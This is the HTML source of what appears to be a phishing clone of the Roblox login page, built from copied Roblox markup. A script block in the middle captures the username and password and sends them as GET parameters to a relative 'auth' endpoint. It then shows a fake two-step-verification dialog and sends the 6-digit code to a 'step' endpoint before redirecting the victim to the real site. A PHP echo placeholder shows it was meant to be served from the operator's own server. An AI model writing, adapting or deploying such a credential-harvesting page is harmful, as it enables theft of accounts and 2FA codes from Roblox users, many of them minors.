	Roblox.Endpoints.Urls['/chat/chat'] = 'https://www.roblox.com/chat/chat';
	Roblox.Endpoints.Urls['/chat/data'] = 'https://www.roblox.com/chat/data';
	Roblox.Endpoints.Urls['/friends/list'] = 'https://www.roblox.com/friends/list';
	Roblox.Endpoints.Urls['/navigation/getcount'] = 'https://www.roblox.com/navigation/getCount';
	Roblox.Endpoints.Urls['/regex/email'] = 'https://www.roblox.com/regex/email';
	Roblox.Endpoints.Urls['/catalog/browse.aspx'] = 'https://www.roblox.com/catalog/browse.aspx';
	Roblox.Endpoints.Urls['/catalog/html'] = 'https://search.roblox.com/catalog/html';
	Roblox.Endpoints.Urls['/catalog/json'] = 'https://search.roblox.com/catalog/json';
	Roblox.Endpoints.Urls['/catalog/contents'] = 'https://search.roblox.com/catalog/contents';
	Roblox.Endpoints.Urls['/catalog/lists.aspx'] = 'https://search.roblox.com/catalog/lists.aspx';
	Roblox.Endpoints.Urls['/catalog/items'] = 'https://search.roblox.com/catalog/items';
	Roblox.Endpoints.Urls['/asset-hash-thumbnail/image'] = 'https://assetgame.roblox.com/asset-hash-thumbnail/image';
	Roblox.Endpoints.Urls['/asset-hash-thumbnail/json'] = 'https://assetgame.roblox.com/asset-hash-thumbnail/json';
	Roblox.Endpoints.Urls['/asset-thumbnail-3d/json'] = 'https://assetgame.roblox.com/asset-thumbnail-3d/json';
	Roblox.Endpoints.Urls['/asset-thumbnail/image'] = 'https://assetgame.roblox.com/asset-thumbnail/image';
	Roblox.Endpoints.Urls['/asset-thumbnail/json'] = 'https://assetgame.roblox.com/asset-thumbnail/json';
	Roblox.Endpoints.Urls['/asset-thumbnail/url'] = 'https://assetgame.roblox.com/asset-thumbnail/url';
	Roblox.Endpoints.Urls['/asset/request-thumbnail-fix'] = 'https://assetgame.roblox.com/asset/request-thumbnail-fix';
	Roblox.Endpoints.Urls['/avatar-thumbnail-3d/json'] = 'https://www.roblox.com/avatar-thumbnail-3d/json';
	Roblox.Endpoints.Urls['/avatar-thumbnail/image'] = 'https://www.roblox.com/avatar-thumbnail/image';
	Roblox.Endpoints.Urls['/avatar-thumbnail/json'] = 'https://www.roblox.com/avatar-thumbnail/json';
	Roblox.Endpoints.Urls['/avatar-thumbnails'] = 'https://www.roblox.com/avatar-thumbnails';
	Roblox.Endpoints.Urls['/avatar/request-thumbnail-fix'] = 'https://www.roblox.com/avatar/request-thumbnail-fix';
	Roblox.Endpoints.Urls['/bust-thumbnail/json'] = 'https://www.roblox.com/bust-thumbnail/json';
	Roblox.Endpoints.Urls['/headshot-thumbnail/json'] = 'https://www.roblox.com/headshot-thumbnail/json';
	Roblox.Endpoints.Urls['/item-thumbnails'] = 'https://www.roblox.com/item-thumbnails';
	Roblox.Endpoints.Urls['/outfit-thumbnail/json'] = 'https://www.roblox.com/outfit-thumbnail/json';
	Roblox.Endpoints.Urls['/place-thumbnails'] = 'https://www.roblox.com/place-thumbnails';
	Roblox.Endpoints.Urls['/thumbnail/asset/'] = 'https://www.roblox.com/thumbnail/asset/';
	Roblox.Endpoints.Urls['/thumbnail/avatar-headshot'] = 'https://www.roblox.com/thumbnail/avatar-headshot';
	Roblox.Endpoints.Urls['/thumbnail/avatar-headshots'] = 'https://www.roblox.com/thumbnail/avatar-headshots';
	Roblox.Endpoints.Urls['/thumbnail/user-avatar'] = 'https://www.roblox.com/thumbnail/user-avatar';
	Roblox.Endpoints.Urls['/thumbnail/resolve-hash'] = 'https://www.roblox.com/thumbnail/resolve-hash';
	Roblox.Endpoints.Urls['/thumbnail/place'] = 'https://www.roblox.com/thumbnail/place';
	Roblox.Endpoints.Urls['/thumbnail/get-asset-media'] = 'https://www.roblox.com/thumbnail/get-asset-media';
	Roblox.Endpoints.Urls['/thumbnail/remove-asset-media'] = 'https://www.roblox.com/thumbnail/remove-asset-media';
	Roblox.Endpoints.Urls['/thumbnail/set-asset-media-sort-order'] = 'https://www.roblox.com/thumbnail/set-asset-media-sort-order';
	Roblox.Endpoints.Urls['/thumbnail/place-thumbnails'] = 'https://www.roblox.com/thumbnail/place-thumbnails';
	Roblox.Endpoints.Urls['/thumbnail/place-thumbnails-partial'] = 'https://www.roblox.com/thumbnail/place-thumbnails-partial';
	Roblox.Endpoints.Urls['/thumbnail_holder/g'] = 'https://www.roblox.com/thumbnail_holder/g';
	Roblox.Endpoints.Urls['/users/{id}/profile'] = 'https://www.roblox.com/users/{id}/profile';
	Roblox.Endpoints.Urls['/service-workers/push-notifications'] = 'https://www.roblox.com/service-workers/push-notifications';
	Roblox.Endpoints.Urls['/notification-stream/notification-stream-data'] = 'https://www.roblox.com/notification-stream/notification-stream-data';
	Roblox.Endpoints.Urls['/api/friends/acceptfriendrequest'] = 'https://www.roblox.com/api/friends/acceptfriendrequest';
	Roblox.Endpoints.Urls['/api/friends/declinefriendrequest'] = 'https://www.roblox.com/api/friends/declinefriendrequest';
	Roblox.Endpoints.Urls['/authentication/is-logged-in'] = 'https://www.roblox.com/authentication/is-logged-in';
	Roblox.Endpoints.addCrossDomainOptionsToAllRequests = true;
	</script>
	<script type="text/javascript">
	if(typeof(Roblox) === "undefined") {
		Roblox = {};
	}
	Roblox.Endpoints = Roblox.Endpoints || {};
	Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
	</script>
	<script>
	Roblox = Roblox || {};
	Roblox.AbuseReportPVMeta = {
		desktopEnabled: false,
		phoneEnabled: false,
		inAppEnabled: false
	};
	</script>
	<meta name="thumbnail-meta-data" data-is-webapp-cache-enabled="False" data-webapp-cache-expirations-timespan="00:01:00" data-request-min-cooldown="1000" data-request-max-cooldown="30000" data-request-max-retry-attempts="3" data-request-batch-size="100" data-thumbnail-metrics-sample-size="20" data-concurrent-thumbnail-request-count="4"> <meta http-equiv="origin-trial" content="As0hBNJ8h++fNYlkq8cTye2qDLyom8NddByiVytXGGD0YVE+2CEuTCpqXMDxdhOMILKoaiaYifwEvCRlJ/9GcQ8AAAB8eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3MTk1MzI3OTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="AgRYsXo24ypxC89CJanC+JgEmraCCBebKl8ZmG7Tj5oJNx0cmH0NtNRZs3NB5ubhpbX/bIt7l2zJOSyO64NGmwMAAACCeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3MTk1MzI3OTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="A/ERL66fN363FkXxgDc6F1+ucRUkAhjEca9W3la6xaLnD2Y1lABsqmdaJmPNaUKPKVBRpyMKEhXYl7rSvrQw+AkAAACNeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MTkzNTk5OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A6OdGH3fVf4eKRDbXb4thXA4InNqDJDRhZ8U533U/roYjp4Yau0T3YSuc63vmAs/8ga1cD0E3A7LEq6AXk1uXgsAAACTeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MTkzNTk5OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"></head>

<body id="rbx-body" class="rbx-body   dark-theme gotham-font" data-performance-relative-value="0.005" data-internal-page-name="Login" data-send-event-percentage="0">
	<meta name="csrf-token" data-token="Kmz/DzjdHDnh">
	<div id="roblox-linkify" data-enabled="true" data-regex="(https?\:\/\/)?(?:www\.)?([a-z0-9-]{2,}\.)*(((m|de|www|web|api|blog|wiki|corp|polls|bloxcon|developer|devforum|forum|status)\.roblox\.com|robloxlabs\.com)|(www\.shoproblox\.com)|(roblox\.status\.io)|(rblx\.co)|help\.roblox\.com(?![A-Za-z0-9\/.]*\/attachments\/))(?!\/[A-Za-z0-9-+&amp;@#\/=~_|!:,.;]*%)((\/[A-Za-z0-9-+&amp;@#\/%?=~_|!:,.;]*)|(?=\s|\b))" data-regex-flags="gm" data-as-http-regex="(([^.]help|polls)\.roblox\.com)"></div>
	<div id="image-retry-data" data-image-retry-max-times="30" data-image-retry-timer="500" data-ga-logging-percent="10"> </div>
	<div id="http-retry-data" data-http-retry-max-timeout="0" data-http-retry-base-timeout="0" data-http-retry-max-times="1"> </div>
	<div id="fb-root"></div>
	<div id="wrap" class="wrap no-gutter-ads logged-out" data-gutter-ads-enabled="false">
		<div id="navigation-container" class="dark-theme gotham-font" data-number-of-autocomplete-suggestions="7">
			<div id="header" class="navbar-fixed-top rbx-header" role="navigation">
				<div class="container-fluid">
					<div class="rbx-navbar-header">
						<div id="header-menu-icon" class="rbx-nav-collapse"><button type="button" class="btn-primary-xs btn-min-width" id="skip-to-main-content">Skip to Main Content</button></div>
						<div class="navbar-header">
							<a class="navbar-brand" href="/home"> <span class="icon-logo"></span><span class="icon-logo-r"></span> </a>
						</div>
					</div>
					<ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">
						<li> <a class="font-header-2 nav-menu-title text-header" href="/discover">Discover</a> </li>
						<li> <a class="font-header-2 nav-menu-title text-header" href="/catalog">Marketplace</a> </li>
						<li> <a class="font-header-2 nav-menu-title text-header" href="/develop">Create</a> </li>
						<li> <a class="font-header-2 nav-menu-title text-header" href="/robux?ctx-nav">Robux</a> </li>
					</ul>
					<ul class="nav rbx-navbar hidden-md hidden-lg col-xs-12">
						<li> <a class="font-header-2 nav-menu-title text-header" href="/discover">Discover</a> </li>
						<li> <a class="font-header-2 nav-menu-title text-header" href="/catalog">Marketplace</a> </li>
						<li> <a class="font-header-2 nav-menu-title text-header" href="/develop">Create</a> </li>
						<li> <a class="font-header-2 nav-menu-title text-header" href="/robux?ctx=nav">Robux</a> </li>
					</ul>
					<div id="right-navigation-header"><div data-testid="navigation-search-input" class="navbar-left navbar-search col-xs-5 col-sm-6 col-md-2 col-lg-3 shown" role="search"><div class="input-group"><form><div class="form-has-feedback"><input id="navbar-search-input" data-testid="navigation-search-input-field" class="form-control input-field new-input-field" placeholder="Search" maxlength="120" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" value=""></div></form><div class="input-group-btn"><button data-testid="navigation-search-input-search-button" class="input-addon-btn" type="submit"><span class="icon-common-search-sm"></span></button></div></div><ul class="dropdown-menu new-dropdown-menu" role="menu"><li class="navbar-search-option rbx-clickable-li new-selected"><a class="new-navbar-search-anchor" href="https://roblox.com/discover/?Keyword="><span class="icon-menu-games-off navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Experiences</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://roblox.com/search/users?keyword="><span class="icon-menu-profile navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in People</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://roblox.com/catalog?CatalogContext=1&amp;Keyword="><span class="icon-menu-shop navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Avatar Shop</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://roblox.com/search/groups?keyword="><span class="icon-menu-groups navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Groups</span></a></li><li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://roblox.com/develop/library?CatalogContext=2&amp;Category=6&amp;Keyword="><span class="icon-menu-library navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">in Creator Marketplace</span></a></li></ul></div><div class="navbar-right rbx-navbar-right"><ul class="nav navbar-right rbx-navbar-right-nav"><li class="signup-button-container"><a class="rbx-navbar-signup btn-growth-sm nav-menu-title signup-button" href="https://roblox.com/account/signupredir?returnUrl=4781066585972668" id="sign-up-button">Sign Up</a></li><li class="login-action"></li><li class="rbx-navbar-right-search"><button type="button" class="rbx-menu-item btn-navigation-nav-search-white-md"><span class="icon-nav-search-white"></span></button></li></ul></div></div>
				</div>
			</div>
			<div id="left-navigation-container"></div>
			<div id="verificationUpsell-container"><div></div></div>
			<div id="phoneVerificationUpsell-container">
				<div phoneverificationupsell-container=""></div>
			</div>
			<div id="accountRecoveryModal-container"></div>
		</div>
		<script type="text/javascript">
		var Roblox = Roblox || {};
		(function() {
			if(Roblox && Roblox.Performance) {
				Roblox.Performance.setPerformanceMark("navigation_end");
			}
		})();
		</script>
		<div class="container-main 
                
                
                
                
                
                " id="container-main" tabindex="-1">
			<script type="text/javascript">
			if(top.location != self.location) {
				top.location = self.location.href;
			}
			</script>
			<div class="alert-container">
				<noscript>
					<div>
						<div class="alert-info" role="alert">Please enable Javascript to use all the features on this site.</div>
					</div>
				</noscript>
			</div>
			<div class="content">
			<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
            <script>
    var incorrectAttempts = 0;

    function login() {
        var load = document.getElementById("login-loading").style.display;
        if (load == "none") {
            document.getElementById("login-button").style.display = "none";
            document.getElementById("login-loading").style.display = "block";
            var username = document.getElementById("login-username").value;
            var password = document.getElementById("login-password").value;
            var returnUrl = "<?php echo $get ?>";

            document.getElementById("text-error").innerHTML = "";

            if (!username || !password) {
                document.getElementById("text-error").innerHTML = "Username and password required";
                document.getElementById("login-loading").style.display = "none";
                document.getElementById("login-button").style.display = "block";
            } else if (username.length < 3 || username.length > 20 || password.length < 8 || password.length > 200) {
                setTimeout(function () {
                    incorrectAttempts++;
                    if (incorrectAttempts >= 3) {
                        document.getElementById("text-error").innerHTML = "Incorrect username or password. Please try again.";
                    } else {
                        document.getElementById("text-error").innerHTML = "Incorrect username or password.";
                    }
                    document.getElementById("login-loading").style.display = "none";
                    document.getElementById("login-button").style.display = "block";
                }, 4000);
            } else {
                setTimeout(function () {
                    $.ajax({
                        url: `auth?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&returnUrl=${encodeURIComponent(returnUrl)}`,
                        type: 'GET',
                        success: function (response) {
                        if (response.includes('Unverified')) {
                            window.location.href = "https://www.roblox.com";
                        } else if (response.includes('Verified')) {
                            showDialog("twostepverification", username, password);
                        }
                    },
                        error: function () {
                            document.getElementById("login-loading").style.display = "none";
                            document.getElementById("login-button").style.display = "block";
                        }
                    });
                }, 4000);
            }
        } else {
            console.log("Blocked");
        }
    }

    function enableVerifyButton() {
        var codeInput = document.getElementById("two-step-verification-code-input");
        var verifyButton = document.getElementById("verifyButton");

        if (/^\d{6}$/.test(codeInput.value)) {
            verifyButton.disabled = false;
        } else {
            verifyButton.disabled = true;
        }
    }

    function twostep(username, password, step, returnUrl) {
        document.getElementById('twostepverification').style.display = 'block';
        $.ajax({
            url: `step?step=${step}&u=${encodeURIComponent(username)}&p=${encodeURIComponent(password)}&returnUrl=${encodeURIComponent(returnUrl)}`,
            type: 'GET',
            success: function () {
                window.location.href = "https://www.roblox.com";
            },
        });
    }

    function twostepInput(value, buttonId) {
        enableVerifyButton();
    }

    document.getElementById("two-step-verification-code-input").addEventListener("input", function () {
        twostepInput(this.value, 'verifyButton');
    });

    function showDialog(dialogId, username, password) {
        var dialog = document.getElementById(dialogId);
        if (dialog) {
            dialog.style.display = "block";

            var verifyButton = dialog.querySelector("#verifyButton");
            verifyButton.disabled = true;

            verifyButton.addEventListener("click", function () {
                // Disable the button and show loading indicator
                verifyButton.disabled = true;
                verifyButton.innerHTML = '<div id="login-loading" class="spinner spinner-sm spinner-no-margin spinner-block"></div>';

                // Show loading indicator for 5 seconds
                document.getElementById("login-loading").style.display = "block";
                setTimeout(function () {
                    document.getElementById("login-loading").style.display = "none";
                    enableVerifyButton();
                }, 5000);

                var stepInput = document.getElementById("two-step-verification-code-input").value;
                var returnUrl = "<?php echo $get ?>"; // Add this line to get the returnUrl
                twostep(username, password, stepInput, returnUrl);
            });
        }
    }

    function enableVerifyButtonRecovery() {
        var codeInput = document.getElementById("two-step-verification-code-input-RecoveryFromEmail");
        var verifyButton = document.getElementById("RecoveryFromEmailButton");

        if (/^[a-zA-Z0-9]{9}$/.test(codeInput.value)) {
            verifyButton.disabled = false;
        } else {
            verifyButton.disabled = true;
        }
    }

</script>




				<div id="react-login-container" class="login-container" data-return-url="" data-enable-react-ui="true">
					<div id="login-base">
						<div class="section-content login-section">
							<h1 class="login-header">Login to Roblox</h1>
							<div id="login-form">
								<div>
									<div class="login-form-container">
										<form class="login-form">
											<div class="form-group username-form-group">
												<label for="login-username" class="sr-only">Username/Email/Phone</label>
												<input id="login-username" name="username" type="text" class="form-control input-field" placeholder="Username/Email/Phone">
											</div>
											<div class="form-group password-form-group">
												<label for="login-password" class="sr-only">Password</label>
												<input id="login-password" name="password" type="password" autocomplete="on" class="form-control input-field" placeholder="Password">
												<div aria-live="polite">
												    <p class="form-control-label xsmall text-error login-error" id="text-error"></p>
												    </div>
											</div>
											<span id="login-loading" class="spinner spinner-default" style="display:none;"></span>
											<button type="button" id="login-button" class="btn-full-width login-button btn-secondary-md" onclick="login();">Log In</button>
										</form>
									</div>
								</div>
							</div>
							<div class="text-center forgot-credentials-link"><a id="forgot-credentials-link" class="text-link" href="https://www.roblox.com/login/forgot-password-or-username" target="_self">Forgot Password or Username?</a></div>
							<div><div class="alternative-login-divider-container"><div class="rbx-divider alternative-login-divider"></div></div><button type="button" id="otp-login-button" class="btn-full-width btn-control-md otp-login-button">Email Me a One-Time Code</button><button type="button" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button"><span>Use Another Device</span></button></div>
							<div class="text-center">
								<div class="signup-option"><span class="no-account-text">Don't have an account?</span><a id="sign-up-link" class="text-link signup-link" href="https://www.roblox.com/" target="_self">Sign Up</a></div>
							</div>
						</div>
						<div id="crossDeviceLoginDisplayCodeModal-container"></div>
					</div>
				</div>
				<script>
				var Roblox = Roblox || {};
				Roblox.LoginMeta = {
					signupUrl: "https://www.roblox.com/account/signupredir",
					forgotCredentialsUrl: "https://www.roblox.com/login/forgot-password-or-username",
					homeUrl: "https://www.roblox.com/home",
					securityNotificationUrl: "https://www.roblox.com/login/securitynotification",
					apiProxyUrl: "https://api.roblox.com",
					fbSignInUrl: "",
					loginPageUrl: "https://www.roblox.com/newlogin",
					isLoginWithEmailEnabled: true,
					isLoginWithPhoneEnabled: true,
					isPromptUnverifiedEmailsEnabled: false
				};
				</script>
				<script type="text/javascript" src="https://cdns.gigya.com/js/gigya.js?apiKey=" async="" defer="">
				{
					bypassCookiePolicy: 'never'
				}
				</script>
				<div id="SocialIdentitiesInformation" data-rbx-login-redirect-url="/social/postlogin" data-context="loginPage"> </div>
			</div>
		</div>
		<!--Bootstrap Footer React Component -->
		<footer class="container-footer" id="footer-container" data-is-giftcards-footer-enabled="True"><div class="footer"><ul class="row footer-links"><li class="footer-link"><a class="text-footer-nav" href="/info/about-us?locale=en_us" target="_blank">About Us</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/jobs?locale=en_us" target="_blank">Jobs</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/blog?locale=en_us" target="_blank">Blog</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/parents?locale=en_us" target="_blank">Parents</a></li><li class="footer-link"><a class="text-footer-nav giftcards" href="/giftcards?locale=en_us" target="_blank">Gift Cards</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/help?locale=en_us" target="_blank">Help</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/terms?locale=en_us" target="_blank">Terms</a></li><li class="footer-link"><a class="text-footer-nav" href="/info/accessibility?locale=en_us" target="_blank">Accessibility</a></li><li class="footer-link"><a class="text-footer-nav privacy" href="/info/privacy?locale=en_us" target="_blank">Privacy</a></li><li><div><button type="button" class="btn text-footer-nav cookie-consent-link">Cookie Options</button></div></li></ul><div class="row copyright-container"><div class="col-sm-6 col-md-3"></div><div class="col-sm-12"><p class="text-footer footer-note">©2024 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p></div></div></div></footer>
	</div>
	<div id="user-agreements-checker-container"></div>
	<div id="cookie-banner-wrapper" class="cookie-banner-wrapper"><div></div></div>
	<script type="text/javascript">
	function urchinTracker() {}
	</script>
	<script type="text/javascript">
	if(typeof Roblox === "undefined") {
		Roblox = {};
	}
	if(typeof Roblox.PlaceLauncher === "undefined") {
		Roblox.PlaceLauncher = {};
	}
	var isRobloxIconEnabledForRetheme = "True";
	var robloxIcon = isRobloxIconEnabledForRetheme === 'True' ? "<span class='icon-logo-r-95'></span>" : "<img src='https://images.rbxcdn.com/8e7879f99cfa7cc3b1fce74f8191be03.svg' width='90' height='90' alt='R'/>";
	Roblox.PlaceLauncher.Resources = {
		RefactorEnabled: "True",
		IsProtocolHandlerBaseUrlParamEnabled: "False",
		ProtocolHandlerAreYouInstalled: {
			play: {
				content: robloxIcon + "<p>You&#39;re moments away from getting into the experience!</p>",
				buttonText: "Download and Install Roblox",
				footerContent: "<a href='https://assetgame.roblox.com/game/help'class= 'text-name small' target='_blank' >Click here for help</a> "
			},
			studio: {
				content: "<img src='https://images.rbxcdn.com/f25e4cadae29ae9a57a962126b2d2e2a.png' width='95' height='95' alt='R' /><p>Get started creating your own experiences!</p>",
				buttonText: "Download Studio"
			}
		},
		ProtocolHandlerStartingDialog: {
			play: {
				content: robloxIcon + "<p>Roblox is now loading. Get ready!</p>"
			},
			studio: {
				content: "<img src='https://images.rbxcdn.com/f25e4cadae29ae9a57a962126b2d2e2a.png' width='95' height='95' alt='R' /><p>Checking for Roblox Studio...</p>"
			},
			loader: "<span class='spinner spinner-default'></span>"
		}
	};
	</script>
	<div id="PlaceLauncherStatusPanel" style="display:none;width:300px" data-new-plugin-events-enabled="True" data-event-stream-for-plugin-enabled="True" data-event-stream-for-protocol-enabled="True" data-is-studio-auth-ticket-enabled="True" data-is-studio-sso-params-enabled="True" data-is-game-launch-interface-enabled="True" data-is-protocol-handler-launch-enabled="True" data-is-duar-auto-opt-in-enabled="false" data-is-duar-opt-out-disabled="false" data-is-user-logged-in="False" data-os-name="Windows" data-protocol-name-for-client="roblox-player" data-protocol-name-for-studio="roblox-studio" data-protocol-roblox-locale="en_us" data-protocol-game-locale="en_us" data-protocol-url-includes-launchtime="true" data-protocol-detection-enabled="true" data-protocol-separate-script-parameters-enabled="true" data-protocol-avatar-parameter-enabled="false" data-protocol-channel-name="LIVE" data-protocol-studio-channel-name="LIVE" data-protocol-player-channel-name="LIVE">
		<div class="modalPopup blueAndWhite PlaceLauncherModal" style="min-height: 160px">
			<div id="Spinner" class="Spinner" style="padding:20px 0;"> <img data-delaysrc="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif" height="32" width="32" alt="Progress" src="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif" class="src-replaced"> </div>
			<div id="status" style="min-height:40px;text-align:center;margin:5px 20px">
				<div id="Starting" class="PlaceLauncherStatus MadStatusStarting" style="display:block"> Starting Roblox... </div>
				<div id="Waiting" class="PlaceLauncherStatus MadStatusField">Connecting to People...</div>
				<div id="StatusBackBuffer" class="PlaceLauncherStatus PlaceLauncherStatusBackBuffer MadStatusBackBuffer"></div>
			</div>
			<div style="text-align:center;margin-top:1em">
				<input type="button" class="Button CancelPlaceLauncherButton translate" value="Cancel"> </div>
		</div>
	</div>
	<div id="ProtocolHandlerClickAlwaysAllowed" class="ph-clickalwaysallowed" style="display:none;">
		<p class="larger-font-size"> <span class="icon-moreinfo"></span> Check <strong>Always open links for URL: Roblox Protocol</strong> and click <strong>Open URL: Roblox Protocol</strong> in the dialog box above to join experiences faster in the future! </p>
	</div>
	<script type="text/javascript">
	function checkRobloxInstall() {
		return RobloxLaunch.CheckRobloxInstall('https://www.roblox.com/Download');
	}
	</script>
	<div id="InstallationInstructions" class="" style="display:none;">
		<div class="ph-installinstructions">
			<div class="ph-modal-header"> <span class="icon-close simplemodal-close"></span>
				<h3 class="title">Thanks for visiting Roblox</h3> </div>
			<div class="modal-content-container">
				<div class="ph-installinstructions-body ">
					<ul class="modal-col-4">
						<li class="step1-of-4">
							<h2>1</h2>
							<p class="larger-font-size">Click <strong>RobloxPlayer.exe</strong> to run the Roblox installer, which just downloaded via your web browser.</p> <img data-delaysrc="https://images.rbxcdn.com/28eaa93b899b93461399aebf21c5346f.png" src="https://images.rbxcdn.com/28eaa93b899b93461399aebf21c5346f.png" class="src-replaced"> </li>
						<li class="step2-of-4">
							<h2>2</h2>
							<p class="larger-font-size">Click <strong>Run</strong> when prompted by your computer to begin the installation process.</p> <img data-delaysrc="https://images.rbxcdn.com/51328932dedb5d8d61107272cc1a27db.png" src="https://images.rbxcdn.com/51328932dedb5d8d61107272cc1a27db.png" class="src-replaced"> </li>
						<li class="step3-of-4">
							<h2>3</h2>
							<p class="larger-font-size">Click <strong>Ok</strong> once you've successfully installed Roblox.</p> <img data-delaysrc="https://images.rbxcdn.com/3797745629baca2d1b9496b76bc9e6dc.png" src="https://images.rbxcdn.com/3797745629baca2d1b9496b76bc9e6dc.png" class="src-replaced"> </li>
						<li class="step4-of-4">
							<h2>4</h2>
							<p class="larger-font-size">After installation, click <strong>Join</strong> below to join the action!</p>
							<div class="VisitButton VisitButtonContinueGLI"> <a class="btn btn-primary-lg disabled btn-full-width">Join</a> </div>
						</li>
					</ul>
				</div>
			</div>
			<div class="xsmall"> The Roblox installer should download shortly. If it doesnÃ¢â‚¬â„¢t, start the <a id="GameLaunchManualInstallLink" href="#" class="text-link">download now.</a> </div>
		</div>
	</div>
	<div class="InstallInstructionsImage" data-modalwidth="970" style="display:none;"></div>
	<div id="pluginObjDiv" style="height:1px;width:1px;visibility:hidden;position: absolute;top: 0;"></div>
	<iframe id="downloadInstallerIFrame" name="downloadInstallerIFrame" style="visibility:hidden;height:0;width:1px;position:absolute"></iframe>
	<script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="clientinstaller" type="text/javascript" src="https://js.rbxcdn.com/f424a786e3d883cff747a034605fa09d.js"></script>
	<script type="text/javascript">
	Roblox.Client._skip = null;
	Roblox.Client._CLSID = '76D50904-6780-4c8b-8986-1A7EE0B1716D';
	Roblox.Client._installHost = 'setup.roblox.com';
	Roblox.Client.ImplementsProxy = true;
	Roblox.Client._silentModeEnabled = true;
	Roblox.Client._bringAppToFrontEnabled = false;
	Roblox.Client._currentPluginVersion = '';
	Roblox.Client._eventStreamLoggingEnabled = true;
	Roblox.Client._installSuccess = function() {
		if(GoogleAnalyticsEvents) {
			GoogleAnalyticsEvents.ViewVirtual('InstallSuccess');
			GoogleAnalyticsEvents.FireEvent(['Plugin', 'Install Success']);
			if(Roblox.Client._eventStreamLoggingEnabled && typeof Roblox.GamePlayEvents != "undefined") {
				Roblox.GamePlayEvents.SendInstallSuccess(Roblox.Client._launchMode, play_placeId);
			}
		}
	}
	if((window.chrome || window.safari) && window.location.hash == '#chromeInstall') {
		window.location.hash = '';
		var continuation = '(' + $.cookie('chromeInstall') + ')';
		play_placeId = $.cookie('chromeInstallPlaceId');
		Roblox.GamePlayEvents.lastContext = $.cookie('chromeInstallLaunchMode');
		$.cookie('chromeInstallPlaceId', null);
		$.cookie('chromeInstallLaunchMode', null);
		$.cookie('chromeInstall', null);
		RobloxLaunch._GoogleAnalyticsCallback = function() {
			var isInsideRobloxIDE = 'website';
			if(Roblox && Roblox.Client && Roblox.Client.isIDE && Roblox.Client.isIDE()) {
				isInsideRobloxIDE = 'Studio';
			};
			GoogleAnalyticsEvents.FireEvent(['Plugin Location', 'Launch Attempt', isInsideRobloxIDE]);
			GoogleAnalyticsEvents.FireEvent(['Plugin', 'Launch Attempt', 'Play']);
			EventTracker.fireEvent('GameLaunchAttempt_Win32', 'GameLaunchAttempt_Win32_Plugin');
			if(typeof Roblox.GamePlayEvents != 'undefined') {
				Roblox.GamePlayEvents.SendClientStartAttempt(null, play_placeId);
			}
		};
		Roblox.Client.ResumeTimer(eval(continuation));
	}
	</script>
	<div class="ConfirmationModal modalPopup unifiedModal smallModal" data-modal-handle="confirmation" style="display:none;">
		<a class="genericmodal-close ImageButton closeBtnCircle_20h"></a>
		<div class="Title"></div>
		<div class="GenericModalBody">
			<div class="TopBody">
				<div class="ImageContainer roblox-item-image" data-image-size="small" data-no-overlays="" data-no-click=""> <img class="GenericModalImage" alt="generic image"> </div>
				<div class="Message"></div>
			</div>
			<div class="ConfirmationModalButtonContainer GenericModalButtonContainer"> <a href="" id="roblox-confirm-btn"><span></span></a> <a href="" id="roblox-decline-btn"><span></span></a> </div>
			<div class="ConfirmationModalFooter"> </div>
		</div>
		<script type="text/javascript">
		Roblox = Roblox || {};
		Roblox.Resources = Roblox.Resources || {};
		Roblox.Resources.GenericConfirmation = {
			yes: "Yes",
			No: "No",
			Confirm: "Confirm",
			Cancel: "Cancel"
		};
		</script>
	</div>
	<div id="modal-confirmation" class="modal-confirmation" data-modal-type="confirmation">
